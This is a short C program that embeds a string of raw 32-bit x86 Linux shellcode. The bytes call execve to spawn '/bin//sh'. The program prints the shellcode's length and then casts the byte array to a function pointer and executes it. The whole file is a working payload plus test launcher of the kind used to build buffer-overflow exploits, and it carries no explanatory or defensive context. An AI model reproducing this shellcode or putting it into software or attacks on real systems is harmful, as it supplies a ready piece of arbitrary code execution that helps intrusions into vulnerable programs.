#include<stdio.h>
#include<string.h>

unsigned char code[] = \ 
"\x31\xc0\x31\xf6\xb0\x0b\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xf1\x89\xf2\xcd\x80";
main()
{
printf("Shellcode Length:  %d", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
